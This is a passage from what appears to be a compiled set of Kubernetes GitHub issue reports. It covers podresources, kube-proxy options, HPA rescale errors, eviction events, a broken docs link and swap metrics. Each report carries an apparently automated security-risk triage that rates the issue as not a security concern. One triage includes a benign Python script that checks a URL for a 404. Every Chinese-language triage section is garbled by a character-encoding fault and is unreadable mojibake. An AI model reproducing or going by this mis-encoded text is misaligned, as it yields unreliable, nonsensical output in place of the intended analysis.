  nodeSelector:
    kubernetes.io/hostname: k8slatest-worker-1.karmalabs.corp
  volumes:
  - hostPath:
      path: /var/lib/kubelet/pod-resources/kubelet.sock
      type: Socket
    name: host-podresources
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.33.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ ¹æ®Issueå†…å®¹å¯çŸ¥ï¼Œè¯¥é—®é¢˜æ˜¯ç”±äº kubelet podresources API é”™è¯¯åœ°è¿”å›äº†å·²ç»ˆæ­¢ Pod çš„èµ„æºåˆ†é…ä¿¡æ¯ï¼Œå¯¼è‡´èµ„æºä¿¡æ¯ä¸å‡†ç¡®ã€‚è¯¥è¡Œä¸ºæ›´å¤šä½“ç°ä¸ºåŠŸèƒ½æ€§æˆ–å¯ç”¨æ€§å±‚é¢çš„ç¼ºé™·ï¼Œå¹¶æœªç›´æ¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€è¶Šæƒè®¿é—®ã€å‘½ä»¤æ‰§è¡Œæˆ–å…¶ä»–å¯åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚å› æ­¤ï¼Œæ­¤Issueå¹¶éå®‰å…¨é—®é¢˜ã€‚

**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueè™½ç„¶ä¼šå¯¹è¿ç»´æˆ–è€…é›†ç¾¤è°ƒåº¦é€ æˆå¹²æ‰°ï¼Œä½†å¹¶æœªæŠ«éœ²æˆ–å¼•å…¥å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œå› æ­¤åœ¨å®‰å…¨é£é™©æ–¹é¢çš„è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œä¸éœ€æä¾›ä¸“é—¨çš„æ¼æ´å¤ç°è„šæœ¬ã€‚è¯¥é—®é¢˜å±äºåŠŸèƒ½æ€§ç¼ºé™·ï¼Œå¯é€šè¿‡æ­£å¸¸çš„å›å½’æµ‹è¯•ä¸ä¿®å¤æµç¨‹è§£å†³ã€‚

---


## Issue #132006 kube-proxy uses deprecated --wait-interval option

- Issue é“¾æ¥ï¼š[#132006](https://github.com/kubernetes/kubernetes/issues/132006)

### Issue å†…å®¹

#### What happened?

ip6tables-legacy-restore -w 5 -W 100000 < save.txt
Ignoring deprecated --wait-interval option.

#### What did you expect to happen?

Do not use deprecated options.

#### How can we reproduce it (as minimally and precisely as possible)?

Please see: https://github.com/kubernetes/kubernetes/issues/131948#issuecomment-2907823184

#### Anything else we need to know?

Originally reported by @aojea in https://github.com/kubernetes/kubernetes/issues/131948#issuecomment-2907823184

#### Kubernetes version

<details>

```console
v1.34.0-alpha.0...
```

</details>


#### Cloud provider

<details>
https://github.com/kubernetes-sigs/cloud-provider-kind
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
https://github.com/kubernetes-sigs/kind
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 2.2
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
kindnetd
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»Issueæè¿°æ¥çœ‹ï¼Œä¸»è¦æ˜¯kube-proxyåœ¨è°ƒç”¨ ip6tables-legacy-restore æ—¶ä½¿ç”¨äº†å·²å¼ƒç”¨ï¼ˆdeprecatedï¼‰çš„ --wait-interval é€‰é¡¹ã€‚è¯¥é€‰é¡¹è™½ç„¶è¢«å¼ƒç”¨ï¼Œä½†å¹¶æœªåœ¨Issueä¸­è¡¨æ˜å…¶é€ æˆäº†ä»»ä½•å®‰å…¨æ¼æ´æˆ–å¯è¢«åˆ©ç”¨çš„é£é™©ã€‚Issueæäº¤è€…çš„æ ¸å¿ƒè¯‰æ±‚æ˜¯å¸Œæœ›ç§»é™¤å·²å¼ƒç”¨çš„å‚æ•°ä»¥é¿å…è­¦å‘Šæˆ–åœ¨æœªæ¥ç‰ˆæœ¬ä¸­å‡ºç°å…¼å®¹æ€§é—®é¢˜ã€‚  
åŸºäºç°æœ‰ä¿¡æ¯ï¼Œè¯¥Issueå¹¶æ²¡æœ‰æŒ‡å‘è®¤è¯ã€æƒé™æ§åˆ¶ã€ä»£ç æ‰§è¡Œç­‰æ•æ„Ÿå®‰å…¨å±‚é¢çš„é—®é¢˜ï¼Œä¹Ÿæœªæš—ç¤ºå­˜åœ¨èµ„æºæ¶ˆè€—ã€æ‹’ç»æœåŠ¡ç­‰å®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç»¼åˆåˆ¤æ–­å¯è®¤ä¸ºè¯¥Issueä¸å®‰å…¨é£é™©æ— å…³ã€‚

**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueå¹¶æœªæ¶‰åŠåˆ°å®‰å…¨æ¼æ´ï¼Œå› æ­¤æ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚è¯¥é—®é¢˜ä»…æ¶‰åŠåœ¨ä½¿ç”¨iptableså‘½ä»¤æ—¶ä¸åº”ç»§ç»­ä½¿ç”¨å·²å¼ƒç”¨é€‰é¡¹ã€‚è‹¥åç»­åœ¨è¯¥é€‰é¡¹ä¸Šå‘ç°å…·ä½“å®‰å…¨éšæ‚£æˆ–å¯è¢«åˆ©ç”¨çš„åœºæ™¯ï¼Œå†è¿›ä¸€æ­¥é’ˆå¯¹æ€§åœ°è¿›è¡Œå®‰å…¨é£é™©è¯„ä¼°ã€‚

---


## Issue #132002 Horizontal Pod Autoscaler reporting FailedRescale error

- Issue é“¾æ¥ï¼š[#132002](https://github.com/kubernetes/kubernetes/issues/132002)

### Issue å†…å®¹

#### What happened?

We are currently running several applications that are configured with metric-based scaling. These applications are expected to scale frequently in response to varying traffic patterns.

Occasionally, we observe the following error during scaling events (though it is not frequent), and there is no noticeable impact on the actual scaling process:

```
reason: FailedRescale, New size: <size>; reason: All metrics <below>/<above> target; error: Operation cannot be fulfilled on deployments.apps: the object has been modified; please apply your changes to the latest version and try again.
```

Our understanding is that this occurs due to a race condition where another controller or a CI/CD process is simultaneously patching or updating the Deployment object at the same time the Horizontal Pod Autoscaler (HPA) attempts to scale it.

**In some cases, we observed the issue occurring even when there were no apparent changes to the Deployment object itself. Only a possible update to the resourceVersion, which we were unable to confirm the reason for the same**


To be cautious, we have set up an alert to notify us if the HPA fails to scale a deployment for any reason. However, encountering this specific error results in unnecessary noise and false positives in our alerting system.

#### What did you expect to happen?

We expect the Horizontal Pod Autoscaler (HPA) to perform retries internally and suppress the reporting of this error, as its occurrence generates unnecessary noise and may cause undue concern regarding system scaling.

#### How can we reproduce it (as minimally and precisely as possible)?

To reproduce the issue:

- Configure a Deployment and Horizontal Pod Autoscaler (HPA) with CPU or memory-based scaling.
- Apply load to the Deployment pods to trigger scaling by the HPA.
- Simultaneously, perform multiple consecutive patch operations on the Deployment.

This sequence will result in the HPA reporting the same error in its events.

#### Anything else we need to know?

NA

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.7-eks-bcf3d70
```

</details>


#### Cloud provider

<details>
AWS - EKS
</details>


#### OS version

<details>

```console
# On MAC:

OS: 15.0.1

$ uname -a
Darwin NOVI-QH6F676G2Y 24.0.0 Darwin Kernel Version 24.0.0: Tue Sep 24 23:39:07 PDT 2024; root:xnu-11215.1.12~1/RELEASE_ARM64_T6000 arm64



```
</details>


#### Install tools

NA

#### Container runtime (CRI) and version (if applicable)

NA

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

NA

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æ‰€æè¿°çš„æƒ…å†µæ˜¯ HPA åœ¨æ‰§è¡Œè‡ªåŠ¨æ‰©ç¼©å®¹æ“ä½œæ—¶ï¼Œä¸å…¶ä»–å¯¹åŒä¸€ Deployment å¯¹è±¡è¿›è¡Œæ›´æ–°æˆ– Patch æ“ä½œçš„è¿›ç¨‹ï¼ˆå¦‚ CI/CD æµç¨‹ï¼‰äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ï¼ˆrace conditionï¼‰ï¼Œå¯¼è‡´ HPA å¯¹è±¡åœ¨å°è¯•æ›´æ–°å·²æœ‰å˜åŒ–çš„ Deployment å¯¹è±¡æ—¶å¤±è´¥ï¼Œå¹¶æŠ¥å‡º FailedRescale é”™è¯¯ã€‚  
ä»æè¿°æ¥çœ‹ï¼Œè¿™ä¸€é—®é¢˜å¹¶éå› ä¸ºåº•å±‚å­˜åœ¨å®‰å…¨æ¼æ´æˆ–é”™è¯¯é…ç½®é€ æˆçš„éé¢„æœŸè®¿é—®ã€æƒé™æå‡æˆ–æ•æ„Ÿä¿¡æ¯æ³„éœ²ç­‰ï¼Œè€Œæ˜¯ Kubernetes ä½“ç³»å†…çš„æ­£å¸¸å¹¶å‘å†²çªé”™è¯¯ï¼Œä¸”å¯¹ç³»ç»Ÿçš„æ­£å¸¸æ‰©ç¼©å®¹åŠŸèƒ½æ— å®è´¨æ€§å½±å“ã€‚ç»¼åˆåˆ¤æ–­ï¼Œæœ¬ Issue å¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æœ¬Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ•…æ— éœ€æä¾›å¤ç°è„šæœ¬
# è¯¥é—®é¢˜ä»…ä¸ºKuberneteså¹¶å‘æ›´æ–°å¼•èµ·çš„FailedRescaleé”™è¯¯
```


---


## Issue #132001 Evicted pods from soft eviction do not always generate an event

- Issue é“¾æ¥ï¼š[#132001](https://github.com/kubernetes/kubernetes/issues/132001)

### Issue å†…å®¹

#### What happened?

When Pods are evicted due to a soft eviction threshold (e.g., disk pressure), most pods have an `Evicted` event(`kubectl get events`), but some do not.

```
root:~# kgetpods infras-logstash-d484d57fc-rkx95
sre  infras-logstash-d484d57fc-rkx95  0/1  Error  0  50m  10.128.6.48  192.168.250.5  

# pod status.reason is Evicted
root:~# ks get pod infras-logstash-d484d57fc-rkx95 -o jsonpath='{.metadata.name}{"\t\t"}{.status.reason}{"\t\t"}{.status.message}{"\n"}'
infras-logstash-d484d57fc-rkx95		Evicted		The node was low on resource: ephemeral-storage. Threshold quantity: 30Gi, available: 24094024Ki. Container infras-logstash was using 2456Ki, request is 0, has larger consumption of ephemeral-storage. 

# kubelet log shows that the pod was successfully evicted
May 28 16:05:50 192-168-250-5 kubelet[2269385]: I0528 16:05:50.514706 2269385 eviction_manager.go:405] "Eviction manager: pods ranked for eviction" pods=["sre/infras-logstash-d484d57fc-rkx95","sre/admin-api-server-847868d7b-7sqdm","scrm/portal-h5-7c46694b8f-bkz95"]
May 28 16:05:54 192-168-250-5 kubelet[2269385]: I0528 16:05:54.802914 2269385 eviction_manager.go:627] "Eviction manager: pod is evicted successfully" pod="sre/infras-logstash-d484d57fc-rkx95"
May 28 16:05:54 192-168-250-5 kubelet[2269385]: I0528 16:05:54.802951 2269385 eviction_manager.go:208] "Eviction manager: pods evicted, waiting for pod to be cleaned up" pods=["sre/infras-logstash-d484d57fc-rkx95"]
May 28 16:05:55 192-168-250-5 kubelet[2269385]: I0528 16:05:55.803984 2269385 eviction_manager.go:458] "Eviction manager: pods successfully cleaned up" pods=["sre/infras-logstash-d484d57fc-rkx95"]

# no Evicted events were found in the k8s events
root:~#kubectl get event --all-namespaces | grep -i infras-logstash-d484d57fc-rkx95
sre           37m         Warning   FailedScheduling               pod/infras-logstash-d484d57fc-rkx95                                                     0/8 nodes are available: 1 Insufficient cpu, 1 node(s) had untolerated taint {node.kubernetes.io/disk-pressure: }, 2 Insufficient memory, 5 node(s) had untolerated taint {dedicated: daemonsets}. preemption: 0/8 nodes are available: 2 No preemption victims found for incoming pod, 6 Preemption is not helpful for scheduling.
sre           43m         Warning   FailedScheduling               pod/infras-logstash-d484d57fc-rkx95                                                     0/8 nodes are available: 1 Insufficient cpu, 1 Insufficient memory, 1 node(s) had untolerated taint {node.kubernetes.io/disk-pressure: }, 5 node(s) had untolerated taint {dedicated: daemonsets}. preemption: 0/8 nodes are available: 2 No preemption victims found for incoming pod, 6 Preemption is not helpful for scheduling.
sre           33m         Warning   FailedScheduling               pod/infras-logstash-d484d57fc-rkx95                                                     0/8 nodes are available: 1 Insufficient cpu, 3 Insufficient memory, 5 node(s) had untolerated taint {dedicated: daemonsets}. preemption: 0/8 nodes are available: 3 No preemption victims found for incoming pod, 5 Preemption is not helpful for scheduling.
sre           33m         Normal    Scheduled                      pod/infras-logstash-d484d57fc-rkx95                                                     Successfully assigned sre/infras-logstash-d484d57fc-rkx95 to 192.168.250.5
sre           33m         Normal    Pulling                        pod/infras-logstash-d484d57fc-rkx95                                                     Pulling image "127.0.0.1:65001/test/service-logstash:202505071553"
sre           30m         Normal    Pulled                         pod/infras-logstash-d484d57fc-rkx95                                                     Successfully pulled image "127.0.0.1:65001/test/service-logstash:202505071553" in 3.035s (2m49.671s including waiting). Image size: 1507547024 bytes.
sre           30m         Normal    Created                        pod/infras-logstash-d484d57fc-rkx95                                                     Created container: infras-logstash
sre           30m         Normal    Started                        pod/infras-logstash-d484d57fc-rkx95                                                     Started container infras-logstash
sre           29m         Warning   Unhealthy                      pod/infras-logstash-d484d57fc-rkx95                                                     Readiness probe failed: Get "http://10.128.6.48:9600/": dial tcp 10.128.6.48:9600: connect: connection refused
sre           29m         Normal    Killing                        pod/infras-logstash-d484d57fc-rkx95                                                     Stopping container infras-logstash
sre           46m         Normal    SuccessfulCreate               replicaset/infras-logstash-d484d57fc                                                    Created pod: infras-logstash-d484d57fc-rkx95

```


#### What did you expect to happen?

Every evicted pod should have an `Evicted` event recorded.

#### How can we reproduce it (as minimally and precisely as possible)?

Use `dd`  to write large files until a soft eviction threshold is crossed. Then observe the pod status and check for  `Evicted` events using `kubectl get events`.



#### Anything else we need to know?

kubelet configuration

<details>

```console
address: 0.0.0.0
apiVersion: kubelet.config.k8s.io/v1beta1
authentication:
  anonymous:
    enabled: false
  webhook:
    cacheTTL: 2m0s
    enabled: true
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook
  webhook:
    cacheAuthorizedTTL: 0s
    cacheUnauthorizedTTL: 0s
cgroupDriver: systemd
clusterDNS:
- 10.96.0.10
clusterDomain: cluster.local
containerRuntimeEndpoint: ""
cpuManagerReconcilePeriod: 0s
crashLoopBackOff: {}
evictionHard:
  imagefs.available: 1Gi
  memory.available: 500Mi
  nodefs.available: 1Gi
  nodefs.inodesFree: 5%
evictionMaxPodGracePeriod: 120
evictionPressureTransitionPeriod: 0s
evictionSoft:
  imagefs.available: 30Gi
  memory.available: 800Mi
  nodefs.available: 5Gi
  nodefs.inodesFree: 10%
evictionSoftGracePeriod:
  imagefs.available: 10s
  memory.available: 5m
  nodefs.available: 10s
  nodefs.inodesFree: 10s
fileCheckFrequency: 0s
healthzBindAddress: 127.0.0.1
healthzPort: 10248
httpCheckFrequency: 0s
imageMaximumGCAge: 0s
imageMinimumGCAge: 0s
kind: KubeletConfiguration
kubeReserved:
  cpu: "0.15"
  memory: 100Mi
logging:
  flushFrequency: 0
  options:
    json:
      infoBufferSize: "0"
    text:
      infoBufferSize: "0"
  verbosity: 0
memorySwap: {}
nodeStatusReportFrequency: 10s
nodeStatusUpdateFrequency: 10s
resolvConf: /run/systemd/resolve/resolv.conf
rotateCertificates: true
runtimeRequestTimeout: 0s
shutdownGracePeriod: 0s
shutdownGracePeriodCriticalPods: 0s
singleProcessOOMKill: true
staticPodPath: /etc/kubernetes/manifests
streamingConnectionIdleTimeout: 0s
syncFrequency: 0s
systemReserved:
  cpu: "0.15"
  memory: 100Mi
volumeStatsAggPeriod: 0s
serverTLSBootstrap: true
```

</details>

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.4
Kustomize Version: v5.5.0
Server Version: v1.32.4

```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

$ uname -a
Linux 192-168-250-4 6.8.0-1021-azure #25-Ubuntu SMP Wed Jan 15 20:45:09 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
crio 1.32.4
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ä»Issueæè¿°å’Œæ—¥å¿—ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œè¯¥é—®é¢˜æ¶‰åŠåœ¨Kubernetesé›†ç¾¤ä¸­ç”±äºè½¯æ€§èµ„æºé˜ˆå€¼(disk pressureç­‰)è§¦å‘Podè¢«é©±é€(Evicted)æ—¶ï¼Œæœ‰äº›å·²ç»è¢«æ­£å¸¸é©±é€çš„Podæ— æ³•åœ¨äº‹ä»¶(Event)åˆ—è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„â€œEvictedâ€äº‹ä»¶ã€‚  
æ­¤é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª Kubernetes äº‹ä»¶è®°å½•ä¸å®Œæ•´æˆ–ä¸ä¸€è‡´çš„åŠŸèƒ½æ€§/å¯è§‚æµ‹æ€§é—®é¢˜ï¼Œå¹¶æœªæ¶‰åŠåˆ°ä»»ä½•å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä¸å½“é…ç½®æˆ–æƒé™ç»•è¿‡ç­‰å®‰å…¨å±‚é¢çš„é—®é¢˜ï¼Œå› è€Œå¹¶ä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬
# æ­¤å¤„ç•™ç©º
```


---


## Issue #131986 Kubelet metrics definitions?

- Issue é“¾æ¥ï¼š[#131986](https://github.com/kubernetes/kubernetes/issues/131986)

### Issue å†…å®¹

#### What happened?

I'm trying to track down how `node_memory_used_bytes` is computed. I view this metric through the lens of GKE in GCP's metrics, but I believe it to be a kubelet metric.

To that end, I suspect it is covered under [Node metrics data](https://kubernetes.io/docs/reference/instrumentation/node-metrics/).

That page says,

> The [kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) gathers metric statistics at the node, volume, pod and container level, and emits this information in the [Summary API](https://kubernetes.io/docs/reference/config-api/kubelet-stats.v1alpha1/).

That "Summary API" sounds like what I want. However, **the link is broken.**

#### What did you expect to happen?

* The kubelet's metrics should be detailed enough to understand them, e.g., so that I can understand if there is sufficient information for the bad behavior in #131913 to be corrected.
* The docs links ought not to be broken.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Go to: https://kubernetes.io/docs/reference/instrumentation/node-metrics/
2. Click "Summary API"
3. Receive 404

#### Anything else we need to know?

_No response_

#### Kubernetes version

N/A

#### Cloud provider

GKE, but N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æŠ¥å‘Šäº† Kubernetes å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¸€ä¸ªé“¾æ¥å¤±æ•ˆé—®é¢˜ã€‚ç”¨æˆ·åœ¨æŸ¥é˜… Kubelet çš„åº¦é‡æŒ‡æ ‡ `node_memory_used_bytes` çš„è®¡ç®—æ–¹å¼æ—¶ï¼Œå‘ç°æ–‡æ¡£é¡µé¢ `https://kubernetes.io/docs/reference/instrumentation/node-metrics/` ä¸­æŒ‡å‘ "Summary API" çš„é“¾æ¥ `https://kubernetes.io/docs/reference/config-api/kubelet-stats.v1alpha1/` è¿”å› 404 é”™è¯¯ã€‚

è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ–‡æ¡£ç»´æŠ¤é—®é¢˜ï¼Œå®ƒå½±å“äº†å¼€å‘è€…å’Œè¿ç»´äººå‘˜è·å–å‡†ç¡®ä¿¡æ¯çš„ä¾¿åˆ©æ€§ï¼Œä½†å¹¶æœªæ­ç¤º Kubernetes è½¯ä»¶æœ¬èº«å­˜åœ¨ä»»ä½•å¯è¢«åˆ©ç”¨çš„æ¼æ´ã€‚é—®é¢˜æ ¸å¿ƒåœ¨äºæ–‡æ¡£é“¾æ¥çš„æŸåï¼Œè€Œä¸æ˜¯è½¯ä»¶åŠŸèƒ½æˆ–å®‰å…¨æœºåˆ¶çš„ç¼ºé™·ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ç±»é—®é¢˜ä¸å±äºå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import requests
import sys
import time

def main():
    """
    è¯¥è„šæœ¬ç”¨äºå¤ç° Issue ä¸­æåˆ°çš„æ–‡æ¡£é“¾æ¥å¤±æ•ˆé—®é¢˜ã€‚
    å®ƒä¼šè®¿é—® Kubernetes å®˜æ–¹æ–‡æ¡£ä¸­æŠ¥å‘Šçš„æŸåé“¾æ¥ï¼Œå¹¶æ£€æŸ¥å…¶ HTTP å“åº”çŠ¶æ€ç ã€‚
    """
    # Issueä¸­æŠ¥å‘Šçš„å·²å¤±æ•ˆçš„ "Summary API" æ–‡æ¡£é“¾æ¥
    broken_link_url = "https://kubernetes.io/docs/reference/config-api/kubelet-stats.v1alpha1/"
    
    print(f"[*] æ­£åœ¨å°è¯•è®¿é—®æŠ¥å‘Šçš„å¤±æ•ˆé“¾æ¥: {broken_link_url}")
    
    start_time = time.time()
    timeout = 120  # è®¾ç½®2åˆ†é’Ÿè¶…æ—¶

    try:
        # å‘é€GETè¯·æ±‚ï¼Œè®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´
        response = requests.get(broken_link_url, timeout=30)
        
        # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
        if time.time() - start_time > timeout:
            print("[!] è„šæœ¬æ‰§è¡Œè¶…æ—¶ã€‚")
            sys.exit(1)

        print(f"[*] æœåŠ¡å™¨è¿”å›çŠ¶æ€ç : {response.status_code}")

        # åˆ¤æ–­çŠ¶æ€ç æ˜¯å¦ä¸º 404
        if response.status_code == 404:
            print("\n[+] æˆåŠŸå¤ç°é—®é¢˜ï¼")
            print(f"[+] é“¾æ¥ {broken_link_url} ç¡®å®è¿”å› 404 Not Foundã€‚")
            print("[+] è¿™è¯å®äº† Issue ä¸­æè¿°çš„æ–‡æ¡£é“¾æ¥å¤±æ•ˆé—®é¢˜ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚")
        else:
            print(f"\n[-] æœªèƒ½å¤ç°é—®é¢˜ã€‚")
            print(f"[-] é“¾æ¥è¿”å›äº†çŠ¶æ€ç  {response.status_code}ï¼Œè€Œä¸æ˜¯é¢„æœŸçš„ 404ã€‚è¯¥é“¾æ¥å¯èƒ½å·²è¢«ä¿®å¤ã€‚")
            sys.exit(1)
            
    except requests.exceptions.RequestException as e:
        print(f"\n[!] è®¿é—®URLæ—¶å‘ç”Ÿç½‘ç»œé”™è¯¯: {e}")
        sys.exit(1)

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬çš„ä½œç”¨æ˜¯éªŒè¯ Issue ä¸­æŠ¥å‘Šçš„æ–‡æ¡£é“¾æ¥å¤±æ•ˆé—®é¢˜ã€‚å®ƒä½¿ç”¨ `requests` åº“å‘ Kubernetes å®˜æ–¹æ–‡æ¡£ä¸­æŒ‡å‡ºçš„å¤±æ•ˆé“¾æ¥å‘é€ä¸€ä¸ª HTTP GET è¯·æ±‚ã€‚è„šæœ¬çš„æ ¸å¿ƒé€»è¾‘æ˜¯æ£€æŸ¥è¯¥è¯·æ±‚çš„å“åº”çŠ¶æ€ç ï¼š
1.  å¦‚æœæœåŠ¡å™¨è¿”å› `404 Not Found` çŠ¶æ€ç ï¼Œåˆ™è¯æ˜è¯¥é“¾æ¥ç¡®å®æ˜¯æŸåçš„ï¼ŒæˆåŠŸå¤ç°äº† Issue ä¸­æè¿°çš„é—®é¢˜ã€‚
2.  å¦‚æœè¿”å›å…¶ä»–çŠ¶æ€ç ï¼ˆå¦‚ `200 OK`ï¼‰ï¼Œåˆ™è¯´æ˜é“¾æ¥å¯èƒ½å·²ç»è¢«ä¿®å¤ï¼Œé—®é¢˜ä¸å†å­˜åœ¨ã€‚
3.  è¯¥è„šæœ¬ä»…ç”¨äºéªŒè¯ä¸€ä¸ªå…¬å¼€æ–‡æ¡£é“¾æ¥çš„å¯ç”¨æ€§ï¼Œä¸ä¸ä»»ä½• Kubernetes é›†ç¾¤æˆ–æ•æ„ŸæœåŠ¡äº¤äº’ï¼Œä¹Ÿä¸æ¶‰åŠä»»ä½•åˆ©ç”¨è¡Œä¸ºã€‚å…¶ç›®çš„æ˜¯ç¡®è®¤æ–‡æ¡£ç¼ºé™·ï¼Œè€Œéæ¼”ç¤ºå®‰å…¨æ¼æ´ã€‚

---


## Issue #131915 Kubelet Swap metrics are missing

- Issue é“¾æ¥ï¼š[#131915](https://github.com/kubernetes/kubernetes/issues/131915)

### Issue å†…å®¹

#### What happened?

Kubelet's swap related metrics were introduced in https://github.com/kubernetes/kubernetes/pull/118865. However, these swap-related metrics are missing from `/metrics/resource` endpoint. Only node-level swap usage metrics are visible. The pod-level and container-level swap usage are available from `/stats/summary` endpoint, but no metrics are visible from `/metrics/resource`.

```
kubectl get --raw "/api/v1/nodes/<node>/proxy/metrics/resource" | grep -i swap
                    
# HELP node_swap_usage_bytes [ALPHA] Current swap usage of the node in bytes. Reported only on non-windows systems
# TYPE node_swap_usage_bytes gauge
node_swap_usage_bytes 3.4340864e+07 1747937814848

kubectl get --raw "/api/v1/nodes/<node>//proxy/stats/summary" | jq ".pods[] | select(.swap.swapUsageBytes > 0)"       

{
  "podRef": {
    "name": "oom-test-pod-stress-ng",
    "namespace": "default",
    "uid": "4bc5b67c-d750-47d4-a36a-5cec6190d752"
  },
  "containers": [
    {
      "name": "memory-eater",
      # ... omitted
      "swap": {
        "time": "2025-05-22T18:19:01Z",
        "swapAvailableBytes": 0,
        "swapUsageBytes": 33554432
      }
    }
  ],
  # omitted...
  "swap": {
    "time": "2025-05-22T18:18:50Z",
    "swapUsageBytes": 33554432
  }
}
```

#### What did you expect to happen?

Container-level swap usage `container_swap_usage_bytes` and pod-level swap usage `pod_swap_usage_bytes` metrics should be available from `/metrics/resource` endpoint.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a node with swap enabled (https://kubernetes.io/blog/2025/03/25/swap-linux-improvements/#install-a-swap-enabled-cluster-with-kubeadm)

Get the swap metrics `kubectl get --raw "/api/v1/nodes/<node-name>/proxy/metrics/resource"

#### Anything else we need to know?

The node is using ~~cadvisor~~ CRI for resource metrics.

Also happened for kind: https://github.com/kubernetes-sigs/kind/issues/3834

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.33.1
Kustomize Version: v5.6.0
Server Version: v1.33.1

$ kubelet --version
Kubernetes v1.33.1
```

</details>


#### Cloud provider

<details>
GKE: v1.33.1
Node: n4-standard-4
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_METRICS_PRODUCT_ID=26
KERNEL_COMMIT_ID=ce1882ff887f9f692176e3431dc39f7f79bf8c72
